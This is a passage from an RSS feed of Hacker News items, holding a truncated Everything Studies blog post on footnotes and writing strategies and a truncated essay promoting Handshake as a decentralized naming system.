<p>It‚Äôs the most efficient way to write but you really must know exactly where you want to go and how to get there, right from the start<a href="#fn_bits" name="ref_bits">[13]</a>. You also need perfect discipline too keep your eyes on the target instead of enjoying the scenery too much, or you get this:</p>
<p><img loading="lazy" data-attachment-id="13664" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-meander1/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png" data-orig-size="1160,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-meander1" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=656" alt="" width="656" height="271" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander1.png 1160w" sizes="(max-width: 656px) 100vw, 656px"></p>
<p>I.e. you mess around developing parts in too much detail. ‚ÄúYeah, yeah I get it, you don‚Äôt need an example, personal story or lengthy explication here‚Äù, says the hypothetical reader and grows bored. Footnotes to the rescue!</p>
<p><img loading="lazy" data-attachment-id="13663" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-meander2/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png" data-orig-size="1120,458" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-meander2" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=656" alt="" width="656" height="268" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-meander2.png 1120w" sizes="(max-width: 656px) 100vw, 656px"></p>
<p>Better. The narrative is rescued and the writer gets to keep their little anecdotes and elaborations.</p>
<p>Or you might be the type that does a lot of free association and thus come up with tons of stuff to try bring into the central narrative: ‚Äúoh and btw I thought of this whichisalsorelevant‚Ä¶‚Äù<a href="#fn_tangent" name="ref_tangent">[14]</a>.</p>
<p><img loading="lazy" data-attachment-id="13662" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-tangents1/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png" data-orig-size="1094,428" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-tangents1" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=656" alt="" width="656" height="257" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents1.png 1094w" sizes="(max-width: 656px) 100vw, 656px">This easily becomes a hot mess, but with notes it turns into this:</p>
<p>Ah.<img loading="lazy" data-attachment-id="13661" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-tangents2/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png" data-orig-size="1126,442" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-tangents2" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=300" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=656" src="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=656" alt="" width="656" height="258" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=656 656w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=150 150w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=300 300w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=768 768w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png?w=1024 1024w, https://everythingstudies.files.wordpress.com/2020/09/notes-tangents2.png 1126w" sizes="(max-width: 656px) 100vw, 656px"></p>
<p>So, footnotes are a coping mechanism for the less-than-perfectly competent and less-than-perfectly ruthless writer, and I love them for it.</p>
<p><a href="#ref_drama" name="fn_drama">[6]</a><br>Sometimes you want to end a post on a particular point where the narrative lands, and having more text after that (if you want to say more) ruins the mood. Luckily you can always turn any afterthought into a footnote and hide it away<a href="#fn_cut" name="ref_cut">[15]</a>.</p>
<p><a href="#ref_easy" name="fn_easy">[7]</a><br>Allowing yourself unlimited footnotes saves you from having to do the hard work to filter, prioritize, and order. Instead you push that job onto the reader, who has to go back and forth<a href="#fn_hypertext" name="ref_hypertext">[16]</a> to read unnecessary side stuff. It can be presumptous to expect readers to be interested in your beside-the-point-meanderings <a href="#fn_this" name="ref_this">[17]</a> instead of valuing the reader‚Äôs time by going straight for the point<a href="#fn_writerf" name="ref_writerf">[18]</a>.</p>
<p><a href="#ref_otoh" name="fn_otoh">[8]</a><br>On the other hand<a href="#fn_wild" name="ref_wild">[19]</a>, it‚Äôs <em>more</em> reader-friendly to put your digressions in footnotes than in the text itself. That way you make the extraneous stuff optional.</p>
<p><a href="#ref_media" name="fn_media">[9]</a><br>I‚Äôve read somewhere<a href="#fn_true" name="ref_true">[20]</a> that Wallace specifically told major parts of the story of <em>Infinite Jest</em><a href="#fn_ij" name="ref_ij">[21]</a> in endnotes<a href="#fn_hypertext" name="ref_hypertext">[16]</a>, sometimes many pages long, in order to simulate the fragmented attention<a href="#fn_links" name="ref_links">[22]</a> characteristic of modern media. If so, he was successful, imo.</p>
<p><a href="#ref_semi" name="fn_semi">[10]</a><br>I use semicolons a lot. I know it‚Äôs supposed to mark you as a pretentious blowhard but what can you do. I still want to do it<a href="#fn_dash" name="ref_dash">[23]</a>. I like them and I‚Äôm almost convinced I‚Äôm using them correctly most of the time.</p>
<p><a href="#ref_short" name="fn_short">[11]</a><br><span><a href="https://everythingstudies.com/2018/12/19/the-romeo-and-juliet-fallacy/" target="_blank" rel="noopener">The Romeo and Juliet Fallacy</a></span>, <span><a href="https://everythingstudies.com/2020/08/18/turnabout-trash/" target="_blank" rel="noopener">Turnabout Trash</a></span>, <span><a href="https://everythingstudies.com/2018/06/21/postmodernism-vs-the-pomoid-cluster/" target="_blank" rel="noopener">Postmodernism vs. the Pomoid Cluster</a></span>, <span><a href="https://everythingstudies.com/2020/02/17/picking-apart-eugenics/" target="_blank" rel="noopener">Picking Apart Eugenics</a></span>, <span><a href="https://everythingstudies.com/2020/01/28/its-not-so-only/" target="_blank" rel="noopener">It‚Äôs Not So Only</a></span>, <span><a href="https://everythingstudies.com/2017/06/20/rant-on-arrival/" target="_blank" rel="noopener">Rant on Arrival</a></span> and of course my most trivial <span><a href="https://everythingstudies.com/2017/10/18/signed-google-translate/" target="_blank" rel="noopener">Signed Google Translate</a></span> were all quick and straightforward to write. In contrast, <span><a href="https://everythingstudies.com/2018/04/26/a-deep-dive-into-the-harris-klein-controversy/" target="_blank" rel="noopener">A Deep Dive into the Harris-Klein Controversy</a></span>, <span><a href="https://everythingstudies.com/2018/11/16/anatomy-of-racism/" target="_blank" rel="noopener">Anatomy of Racism</a></span>, <span><a href="https://everythingstudies.com/2017/05/29/the-good-the-true-and-the-undefined/" target="_blank" rel="noopener">The True, The Good and the Undefined</a></span>, <span><a href="https://everythingstudies.com/2019/05/13/a-defense-of-erisology/" target="_blank" rel="noopener">A Defense of Erisology</a></span>, and all my book review posts took a whole lot of time, and effort to write, structure, re-structure and line edit. I think more effort translates into better posts on the whole, but the relationship isn‚Äôt perfect.</p>
<p><a href="#ref_started" name="fn_started">[12]</a><br>Once I started to write this it was easy and quick because of how modular it is<a href="#fn_paper" name="ref_paper">[24]</a><a href="#fn_work" name="ref_work">[25]</a><a href="#fn_tricky" name="ref_tricky">[26]</a>. I could just write and write, jot down any random shit<a href="#fn_tangent" name="ref_tangent">[14]</a> I could think of and attach it to whatever vaguely relevant. The format allows anything, even silly jokes<a href="#fn_self" name="ref_self">[27]</a>. Really, once you‚Äôre free from the constraint of having a point and being coherent past the paragraph level, writing is as easy as thinking<a href="#fn_book" name="ref_book">[28]</a>.</p>
<p><a href="#ref_bits" name="fn_bits">[13]</a><br>You don‚Äôt always start writing with a clear plan. As discussed <span><a href="https://everythingstudies.com/2020/05/22/leftovers-from-last-time/" target="_blank" rel="noopener">here</a></span>, my raw materials for a piece are often just a lump of interrelated thoughts and motifs. Most of my book reviews were easy to start and push to a decent word count because I just wrote down reactions as I read, which was easy because hey, the book itself had established a context<a href="#fn_tangent" name="ref_tangent">[14]</a>. The difficult part came later, when I had to massage it into something with a thesis.</p>
<p>This ‚Äúpatchwork‚Äù strategy of writing small parts spontaneously and putting them together into a narrative arc later is one out of three main writing strategies<a href="#fn_music" name="ref_music">[29]</a>.&nbsp;</p>
<p><img loading="lazy" data-attachment-id="13660" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-strat1/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png" data-orig-size="446,642" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-strat1" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png?w=208" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png?w=446" src="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png" alt="" width="446" height="642" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png 446w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png?w=104&amp;h=150 104w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat1.png?w=208&amp;h=300 208w" sizes="(max-width: 446px) 100vw, 446px"></p>
<p>Another one is to make a rough outline and then elaborate each part.</p>
<p><img loading="lazy" data-attachment-id="13659" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-strat2/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png" data-orig-size="448,668" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-strat2" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png?w=201" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png?w=448" src="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png" alt="" width="448" height="668" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png 448w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png?w=101&amp;h=150 101w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat2.png?w=201&amp;h=300 201w" sizes="(max-width: 448px) 100vw, 448px"></p>
<p>You need to know where you want to end up and how to get there. If what you‚Äôre trying to say is complex and difficult in ways that won‚Äôt reveal themselves fully before you write it all out, you‚Äôre in for a world of hurt with this technique.</p>
<p>Finally, you can just write it straight through from start to finish, seeing where inspiration takes you.</p>
<p><img loading="lazy" data-attachment-id="13658" data-permalink="https://everythingstudies.com/2020/09/24/notes-on-notes/notes-strat3/" data-orig-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png" data-orig-size="450,606" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="notes-strat3" data-image-description="" data-medium-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png?w=223" data-large-file="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png?w=450" src="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png" alt="" width="450" height="606" srcset="https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png 450w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png?w=111&amp;h=150 111w, https://everythingstudies.files.wordpress.com/2020/09/notes-strat3.png?w=223&amp;h=300 223w" sizes="(max-width: 450px) 100vw, 450px"></p>
<p>This is great for exploratory writing, and if you‚Äôre good at this you can be an incredibly productive writer. If you‚Äôre <em>not</em> good at it, if you have trouble keeping your explorations focused ‚Äî like me ‚Äî you risk starting with a lot of enthusiasm and just run off into the wild, get lost and bogged down, and lose interest.</p>
<p>Which is best? Nobody knows and writers have different tastes. For me it depends on the topic and my relationship to it. This footnote piece was perfect for the last(ish) strategy because it allowed me to just write and write without having to keep things on track or come to a natural close. For once that was actually ok.</p>
<p><a href="#ref_tangent" name="fn_tangent">[14]</a><br>I find it hard to write without an established context because I have little trust in my ability to communicate ideas without a lot of introductory groundwork. I feel I need to clue the reader into the entirety of my personal background with the idea I‚Äôm about to discuss in order to communicate it accurately. So, I‚Äôm often tempted to put a random thought as a footnote rather than as a post of its own because that way there‚Äôs already a context and background for that thought and I don‚Äôt need to bootstrap one all over again. It‚Äôs a way to get a thought out of your system when you just know you won‚Äôt prioritize developing it properly later<a href="#fn_perfect" name="ref_perfect">[30]</a>.</p>
<p><a href="#ref_cut" name="fn_cut">[15]</a><br>This is a weak thought that I probably should have cut, but at the stage in the writing process where I first wrote it I had the idea that more, messier and tanglier is better for this particular post and thus I should throw in everything I had<a href="#fn_perv" name="ref_perv">[31]</a>. In retrospect I doubt that was a good idea and ditched some things ‚Äî but I still kept this one since it allowed me to write <em>this</em> note.</p>
<p><a href="#ref_hypertext" name="fn_hypertext">[16]</a><br>In other words: <em>hypertext</em>, all the rage in the 90s after the invention of the WWW and the hyperlink. Think of the possibilities! It remains unpopular as an essay/book genre because of how difficult it is to navigate and how unclear the upside is.</p>
<p><a href="#ref_this" name="fn_this">[17]</a><br>This post is me experimenting with form<a href="#fn_meditation" name="ref_meditation">[32]</a> and free association, mostly to entertain myself. It‚Äôs self-absorbed and not reader-friendly<a href="#fn_para" name="ref_para">[33]</a>, and I don‚Äôt expect it to be a ‚Äúhit‚Äù<a href="#fn_told" name="ref_told">[34]</a>. You might call it‚Ä¶ anti-viral.</p>
<p><a href="#ref_writerf" name="fn_writerf">[18]</a><br>It‚Äôs writer-focused writing, as opposed to reader-focused writing<a href="#fn_creatives" name="ref_creatives">[35]</a><a href="#fn_para" name="ref_para">[33]</a>, and there‚Äôs only so much of it you can do before it becomes obnoxious. I‚Äôll dial back on it after this post<a href="#fn_promise" name="ref_promise">[36]</a>.</p>
<p><a href="#ref_wild" name="fn_wild">[19]</a><br>I‚Äôm allowing my ‚Äúon the other hand‚Äù tendencies to run wild. I doubt it improves my writing. On the other hand‚Ä¶<a href="#fn_this" name="ref_this">[17]</a></p>
<p><a href="#ref_true" name="fn_true">[20]</a><br>That means it‚Äôs true.</p>
<p><a href="#ref_ij" name="fn_ij">[21]</a><br>Much of what I‚Äôve read recently that perhaps qualifies as ‚Äúserious literature‚Äù (I‚Äôm thinking of <em>Infinite Jest</em>, <em>The Gold Bug Variations</em>, <em>Foucault‚Äôs Pendulum</em> and <em>The Glass Bead Game</em>) have something in common: I enjoy thinking about them afterwards a lot more than I enjoyed reading them. <span><a href="https://everythingstudies.com/2017/04/06/reactions-to-infinite-jest/" target="_blank" rel="noopener">My review of Infinite Jest</a></span> was quite negative but now I look back fondly on it<a href="#fn_predicted" name="ref_predicted">[37]</a>. I wonder why this pattern exists. Do books have to be a chore to read to have complex, rewarding ideas<a href="#fn_difficulty" name="ref_difficulty">[38]</a>? I really don‚Äôt see why<a href="#fn_hitchhiker" name="ref_hitchhiker">[39]</a>, and can‚Äôt help thinking that only books that are off-putting to casual readers earn the ‚Äúserious literature‚Äù label because status is based on differentiation and exclusion. To be ‚Äúworthy‚Äù it <em>must</em> be disliked by the plebs. How else will liking it mark me as a member of an elite?</p>
<p><a href="#ref_links" name="fn_links">[22]</a><br>There‚Äôs an ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://everythingstudies.com/2020/09/24/notes-on-notes/">https://everythingstudies.com/2020/09/24/notes-on-notes/</a></em></p>]]>
            </description>
            <link>https://everythingstudies.com/2020/09/24/notes-on-notes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579351</guid>
            <pubDate>Thu, 24 Sep 2020 15:12:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Handshake ‚Äì A Namespace for the Decentralized Web]]>
            </title>
            <description>
<![CDATA[
Score 136 | Comments 82 (<a href="https://news.ycombinator.com/item?id=24579284">thread link</a>) | @rasengan
<br/>
September 24, 2020 | https://meowis.ms/handshake.html | <a href="https://web.archive.org/web/*/https://meowis.ms/handshake.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a href="https://meowis.ms/"> &lt; </a>




<!-- <div class="subtitle"></div> -->

<p>Names are fundamental to human existence and how we relate to everything in the world. At the heart of all interactions lies the ability for all the parties to match names to the respective entities they stand for.</p>

<p>Names are so integral to the human experience that a strong argument can be made that if <em>something doesn√¢‚Ç¨‚Ñ¢t have a name, it does not exist.</em></p>

<p>Correspondingly, names on the internet are critical to our online existence. Users, apps, or machines locate a resource on the internet via its name. The name needs to not only be understood by humans but also needs to be uniquely identifiable by machines amongst the billions of potential destinations.</p>

<p>Given that the act of matching a name to the eventual resource is the starting point of trillions of internet transactions that happen daily,  it is no surprise that out of the three core layers of internet stack - naming (DNS), transportation (TCP/IP) and application (HTTP), naming is at the very start of the stack.</p>

<p>Naming needs a single source of truth as the names within the namespaces have to be unique across the whole system. Hence, an effective naming system cannot merely be a standard or a protocol, it has to meet all the other aspects of running an internet-scale namespace - including enforcement of unique names, the management of the naming records, scaling to internet traffic, while remaining fully accessible to anyone, anywhere.</p>

<h2 id="namespaces">Namespaces</h2>

<p>Names are the most valuable assets on the internet, but we don√¢‚Ç¨‚Ñ¢t own our own names. All of the crucial namespaces belong to centralized entities who control the namespaces and take that control away from you. This is true for all significant namespaces today - the ICANN namespace, Facebook, Twitter, and Google.</p>

<p>As a result, your name on the internet does not belong to you, but rather to the owners of these centralized namespaces.  With a stroke of the keyboard, they can remove anyone from existence.  If your name lives on a centralized namespace, your right to exist effectively belongs to someone else.</p>

<p>Centralized namespaces also determine much more than a user√¢‚Ç¨‚Ñ¢s ability to exist. They also decree a user√¢‚Ç¨‚Ñ¢s ability to search, match, and communicate with others. They unilaterally set the framework for what protocols can be used, which use cases are permitted, and what information can flow.</p>

<p>The power to enforce monopolies with little consequence also makes these centralized namespaces some of the most valuable properties on the internet today. Verisign makes billions a year controlling .com with practically zero innovation, while ICANN has the power to arbitrarily raise price caps of entire TLDs with their pet cartel companies. Facebook and Twitter controls exactly how users can use their names/accounts, and can heedlessly cancel pages and remove identities for barely specified reasons.</p>

<p>Everywhere we see, we are seeing the serious dangers of depending on centralized entities to exist and be found by others. The Internet is supposed to be kingless, but the ability to strike away one√¢‚Ç¨‚Ñ¢s existence and control exactly how the name is to be used makes the owners of these namespaces the de-facto kings/governors of the internet.</p>

<h2 id="the-world-needs-a-decentralized-namespace">The World Needs a Decentralized Namespace</h2>

<p>Of course, the ability of these centralized namespace owners to control digital existence, lockout access, and enforce monopolistic economics is the complete opposite goal of the decentralized web, which is the ability to exist, innovate, and create their own business models without the need for centralized control or systems.</p>

<p>Whether it√¢‚Ç¨‚Ñ¢s decentralized currencies, decentralized file systems, or decentralized servers - if these decentralized entities do not live on a widely used namespace, they simply do not exist to the vast majority of users on the internet.</p>

<p><em>Without a decentralized namespace widely readable by humans and resolvable by machines, it is impossible for the decentralized world to be widely adopted by users</em>.</p>

<p><strong>Criteria for a Decentralized Naming System</strong></p>

<p>Naming systems play a crucial role in discovery, connection and identification. As one of the most fundamental and long-lasting components of the internet backbone infrastructure, the bar needs to be set very high in terms of longevity, stability, and technical scalability.</p>

<p>For a decentralized naming system to become the legitimate namespace for the decentralized world, the bar is even higher. Without a centralized body in charge, the world has to trust that this naming system will exist in a stable state for a long time to come and stay relevant regardless of potential upheavals and technological progress.</p>

<p>As such, this naming system√¢‚Ç¨‚Ñ¢s fundamental construction needs to have certain key technical, social, and governance requirements:</p>

<ol>
  <li><strong>Be truly decentralized</strong>: what is the point of a decentralized naming system if it remains controlled by a small set of people?</li>
  <li><strong>Main key focus as a naming system</strong>: naming systems need to be extremely focused and fast. Can you imagine the DNS system operating reliably if it was also designed for delivering 4K video?</li>
  <li><strong>Be as accessible yet trustless as possible</strong>: anyone should be able to access the namespace directly in a fully trustless manner without intensive resources</li>
  <li><strong>Compatible with the rest of the internet</strong>: allowing for seamless usage with the rest of the application, user, and technical stack</li>
  <li><strong>Stability and upgradability at the protocol level</strong>: allowing for innovation moving forward without disrupting regular operations</li>
</ol>

<h2 id="handshake-design">Handshake Design</h2>

<p>Given these objectives, and with the general goal of the decentralized root zone and certificate authority, Handshake is the only naming system that is fundamentally suitable to be the namespace for decentralized web.</p>

<h3 id="1-focus-as-a-naming-system">1. Focus as a Naming System</h3>

<p>Let√¢‚Ç¨‚Ñ¢s consider the inherent complexity of an internet-scale naming system. For reference, the naming layer (DNS), unlike the other layers of the internet stack, is the only layer that is a system and not a protocol - the key difference between the two is that a protocol cannot enforce uniqueness of names, which is essential to a functioning namespace. It√¢‚Ç¨‚Ñ¢s also arguably by far the most complex layer with many competing technical, political, and economical demands.</p>

<p>As a standalone blockchain, Handshake has room to grow all on its own and govern itself without interfering with other projects or having to compete with different priorities with other use cases (like gaming or DeFi) trying to run in parallel on the same network. In addition, there are several fundamental constraints in other blockchains - for example, Bitcoin limited OP sizes and Ethereum√¢‚Ç¨‚Ñ¢s notoriously hard to sync blockchain.</p>

<p>If Handshake is built on another blockchain, the instability caused by these competing priorities for use cases and political interests also eliminates one of the core requirements for a decentralized naming infrastructure - which is stability. A naming infrastructure needs to be highly stable - remember - both users, hosts and developers need to be confident that the names will be around for a long time in the same format. For instance, Ethereum√¢‚Ç¨‚Ñ¢s sky high gas prices due to DeFi and the complex migration to ETH2 are both creating high levels of certainty around how apps will work in the future, and whether retail users will be able to have the same level of access as large ticket users.</p>

<p>Lastly, creating a native auction system is complicated and requires highly specific primitives, such as making coins unspendable for certain periods, and increases the complexity of the system if HNS is a non-native token.</p>

<h3 id="2-decentralization">2. Decentralization</h3>

<p>The other critical consideration is decentralization. <em>Remember, the goal here is to achieve a truly decentralized, uncensorable namespace independent of centralized control and policies. Anything less than will be completely redundant.</em></p>

<p>Ethereum is the most decentralized smart contract platform of date, but it√¢‚Ç¨‚Ñ¢s still insufficient as a base layer blockchain for a truly decentralized naming system. A system based on Ethereum either would have to be strictly immutable or engineer a governance mechanism with a single or multiple signers. For example, the ENS system on Ethereum has a 7-part multisig making it either censorable and shutting it off to any future innovations or upgrades. These mechanisms either risk shutting off future innovations or don√¢‚Ç¨‚Ñ¢t meet the decentralized requirement.</p>

<p>How about sidechains? Sidechains mostly rely on the main chain√¢‚Ç¨‚Ñ¢s security, which makes them completely subject to the same concerns above in terms of sharing priorities with the main chain. In addition, there is currently no such thing as a decentralized side-chain on Bitcoin. Counterparty is a one-way system, Liquid requires a small federated multisig, and Rootstock is currently federated waiting on Drivechain support from Bitcoin.</p>

<p>For all of PoW√¢‚Ç¨‚Ñ¢s issues, namely with the limited number of miners, it is built on competition which is inherently decentralized as well as clear separation of concerns between developers, users, and miners. This is in contrast to PoS which encourages stakeholders to collude and centralize, creating a largely plutocratic environment.</p>

<p>As such, true naming decentralization with the ability to upgrade is likely best achieved on a standalone PoW chain with robust hash power, a strong ecosystem, and miner confidence in the value of the blockchain.</p>

<h3 id="3-ease-of-trustless-resolution">3. Ease of Trustless Resolution</h3>

<p>Compared to other naming blockchains, _the entire Handshake stack is engineered for the use case of creating a human readable, truly decentralized, fully accessible and secure namespace. _</p>

<p>The naming data in Handshake is stored in a novel data structure called an Urkel Tree,  which was designed specifically for this purpose. The proofs are small and verify quickly, allowing name resolution to happen with very little computation.</p>

<p>Secondly, a highly unique application called HNSD written in C only handles the DNS functions of Handshake (avoiding ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://meowis.ms/handshake.html">https://meowis.ms/handshake.html</a></em></p>]]>
            </description>
            <link>https://meowis.ms/handshake.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579284</guid>
            <pubDate>Thu, 24 Sep 2020 15:05:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Twitter mob is good for business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579258">thread link</a>) | @Reedx
<br/>
September 24, 2020 | https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business | <a href="https://web.archive.org/web/*/https://www.rocanews.com/blog-posts/the-twitter-mob-is-good-for-business">archive.org</a>
